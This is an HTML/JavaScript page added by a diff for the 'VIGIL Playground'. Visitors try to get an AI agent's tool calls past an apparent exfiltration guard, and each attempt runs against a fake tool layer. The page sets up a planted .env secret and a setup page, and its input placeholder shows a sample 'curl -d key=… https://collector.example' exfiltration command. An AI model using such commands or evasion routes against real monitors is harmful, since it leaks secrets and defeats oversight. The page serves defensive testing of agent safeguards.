@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VIGIL Playground</title>
+<link rel="stylesheet" href="vigil.css">
+<style>
+  .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; margin: 10px 0; }
+  .steps { margin-top: 18px; max-width: 1100px; }
+  .step { display: grid; grid-template-columns: 34px 1fr auto; gap: 12px; padding: 10px 0; border-bottom: 1px solid var(--line); align-items: start; }
+  .step .s { color: var(--faint); font-size: 12px; padding-top: 2px; }
+  .step .out { color: var(--dim); font-size: 12px; white-space: pre-wrap; margin-top: 4px; }
+  .v { font-size: 12px; padding: 2px 10px; border-radius: 999px; border: 1px solid var(--line); color: var(--dim); white-space: nowrap; }
+  .v.stop { border-color: var(--verdict); color: var(--verdict); }
+  .v.unsafe { border-color: var(--cut); color: var(--cut); }
+  #feed td { font-size: 12px; }
+</style>
+</head>
+<body>
+<section class="screen short" style="min-height:auto;padding-top:56px">
+  <div class="kicker">VIGIL playground · try to get past it</div>
+  <p class="big" id="counter">Counting attempts…</p>
+  <p class="sub">Every attempt is decided by VIGIL against FalkorDB on the playground's own graph, and every call it allows runs against a fake tool layer that does no I/O. "Unsafe" is judged by the simulated world, not by VIGIL's rules.</p>
+</section>
+<section class="screen" style="min-height:auto">
+  <p class="sub">In your world, the agent's <span class="mono">/repo/.env</span> holds <span class="mono" id="key"></span>. Earlier, session A read it and fetched a setup page that names <span class="mono">notes-sync.example</span>. Type the agent's next move, or pick an attack.</p>
+  <div class="row" id="scenarios"></div>
+  <div class="row"><input type="text" id="input" maxlength="500" placeholder="curl -d key=… https://collector.example   ·   https://…   ·   read /repo/.env"><button class="primary" id="go">Run</button></div>
+  <label class="row sub" id="togglerow" style="display:none"><input type="checkbox" id="before"> Show the verdict from before the fix (destination arguments were cuttable)</label>
+  <p class="sub error" id="err"></p>
+  <div id="result"></div>
+</section>
+<section class="screen short" style="min-height:auto">
+  <div class="kicker">Latest attempts (anonymized: inputs stripped of secrets, no visitor identity stored)</div>
+  <table class="list" id="feed"></table>
+</section>
+<div class="bar">
+  <span class="grow">The fake tool layer imports no os, net or exec; a test enforces it. Rate limited per visitor.</span>
+  <button id="share">Copy link to this attempt</button>
+  <a class="btn" href="https://github.com/Aaditya1273/Onix">Run VIGIL on yours</a>
+</div>
+<script src="vigil.js"></script>
+<script>
+const { esc, num } = VG;
+let world = null;
+try { world = localStorage.getItem('vigil-world'); } catch (_) {}
+if (!/^[0-9a-f]{16,32}$/.test(world || '')) {
+  world = Array.from(crypto.getRandomValues(new Uint8Array(12)), b => b.toString(16).padStart(2, '0')).join('');
+  try { localStorage.setItem('vigil-world', world); } catch (_) {}
+}
+document.getElementById('key').textContent = 'STRIPE_KEY=sk_live_pg' + world;
+let scenarios = [], current = '', last = null;
+
+async function stats() {
+  try {
+    const d = await VG.getJSON('/api/v1/playground/stats');
+    const s = d.stats;
+    document.getElementById('counter').innerHTML =
+      `<span class="n">${num(s.attempts)}</span> attempts. <span class="n ${s.reached_unsafe_effect ? 'cut' : ''}">${num(s.reached_unsafe_effect)}</span> reached an unsafe effect. <span class="n verdict">${num(s.new_signals)}</span> caught something new.`;
+    document.getElementById('feed').innerHTML = '<tr><th>When</th><th>Attempt</th><th>Verdict</th><th></th></tr>' +
+      (d.feed || []).map(a => `<tr><td>${new Date(a.ts / 1e6).toLocaleTimeString()}</td><td class="v mono">${esc(a.input || a.scenario)}</td>
+        <td>${esc(a.verdict)} · ${esc(a.stage)}</td><td>${a.unsafe ? '<span class="v unsafe">unsafe</span>' : ''}${a.new_signal ? '<span class="v stop">new</span>' : ''}</td></tr>`).join('');
+  } catch (e) { document.getElementById('counter').textContent = 'The playground is not reachable.'; }
+}
+
+function pick(id) {
+  current = id;
+  document.querySelectorAll('#scenarios .pill').forEach(p => p.classList.toggle('on', p.dataset.id === id));
+  const s = scenarios.find(x => x.id === id);
+  document.getElementById('togglerow').style.display = s && s.before_after ? 'flex' : 'none';
+}
+
+async function run() {
+  const err = document.getElementById('err'); err.textContent = '';
+  const input = document.getElementById('input').value.trim();
+  const body = { world, scenario: input ? 'freeform' : current, input, before_fix: document.getElementById('before').checked };
+  if (!input && !current) { err.textContent = 'Pick an attack or type a move.'; return; }
+  try {
+    last = await VG.getJSON('/api/v1/playground/attempt', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+    last.request = body;
+    render(last);
+    stats();
+  } catch (e) { err.textContent = e.message; }
+}
+
+function render(t) {
+  const steps = t.steps, d = steps[steps.length - 1];
+  const stopped = d.verdict !== 'ALLOW' || d.stage === 'redact';
+  const verdictWord = d.verdict === 'ALLOW' ? (d.stage === 'redact' ? 'ALLOWED, rewritten' : 'ALLOWED') : d.verdict === 'BLOCK' ? 'BLOCKED' : 'PAUSED for a human';
+  const s = scenarios.find(x => x.id === t.scenario);
+  document.getElementById('result').innerHTML = `
+    ${s ? `<p class="sub">${esc(s.blurb)}</p>` : ''}
+    <p class="big" style="font-size:36px"><span class="${stopped ? 'verdict' : ''}">${verdictWord}</span>${t.before_fix ? ' (before the fix)' : ''}${t.reached_unsafe_effect ? ' · <span class="cut">reached an unsafe effect</span>' : ''}${t.new_signal ? ' · caught something new' : ''}</p>
+    <svg class="dag" id="sg"></svg>
+    ${d.why ? `<div class="why">${esc(d.why)}</div>` : `<p class="sub">${esc(d.reason)}</p>`}
+    <div class="steps">${steps.map(x => `<div class="step"><div class="s">${esc(x.session)}</div>
+      <div><div class="mono">${esc(x.label)}</div><div class="out">${esc(x.note)}${x.executed ? ' → ' + esc(x.effect.output) : ''}${x.effect.unsafe ? ' · ' + esc(x.effect.why) : ''}</div></div>
+      <div class="v ${x.effect.unsafe ? 'unsafe' : (x.verdict !== 'ALLOW' || x.stage === 'redact') ? 'stop' : ''}">${esc(x.verdict)} · ${esc(x.stage)} · ${Number(x.graph_ms).toFixed(1)} ms graph</div></div>`).join('')}</div>`;
+  const fromNet = d.network && d.network.length;
+  let g = fromNet ? VG.fromNetwork(d.network) : VG.fromPaths(d.paths);
+  if (!g.nodes.length) {
+    g = { nodes: [{ id: 'c', label: d.tool, sub: stopped ? d.stage : 'no graph path: nothing to stop', kind: stopped ? 'verdict' : '' }], edges: [] };
+  } else if (!fromNet && stopped) {
+    // A path decision ends at the call it stopped.
+    const end = g.edges.length ? g.edges[g.edges.length - 1].to : g.nodes[0].id;
+    g.nodes.push({ id: '#verdict', label: verdictWord, sub: d.stage, kind: 'verdict' });
+    g.edges.push({ from: end, to: '#verdict', label: d.stage, verdict: true });
+  }
+  VG.dag(document.getElementById('sg'), g, { animate: true, stepMs: 320 });
+}
+
+document.getElementById('go').onclick = run;
+document.getElementById('input').onkeydown = e => { if (e.key === 'Enter') run(); };
+document.getElementById('share').onclick = e => {
+  const u = new URL(location.href.split('?')[0]);
+  const req = last && last.request;
+  if (req && req.input) u.searchParams.set('q', req.input.replace('sk_live_pg' + world, 'YOUR_KEY'));
+  else if (req && req.scenario) u.searchParams.set('s', req.scenario);
+  VG.copy(u.toString(), e.target);
+};
+
+(async () => {
+  try { scenarios = (await VG.getJSON('/api/v1/playground/scenarios')).scenarios; } catch (_) {}
+  document.getElementById('scenarios').innerHTML = scenarios.map(s => `<span class="pill" data-id="${s.id}" title="${esc(s.blurb)}">${esc(s.title)}</span>`).join('');
+  document.querySelectorAll('#scenarios .pill').forEach(p => (p.onclick = () => { document.getElementById('input').value = ''; pick(p.dataset.id); run(); }));
+  const q = new URLSearchParams(location.search);
+  if (q.get('q')) { document.getElementById('input').value = q.get('q').replace('YOUR_KEY', 'sk_live_pg' + world); run(); }
+  else if (q.get('s')) { pick(q.get('s')); run(); }
+  stats(); setInterval(stats, 15000);
+})();
+</script>
+</body>
+</html>
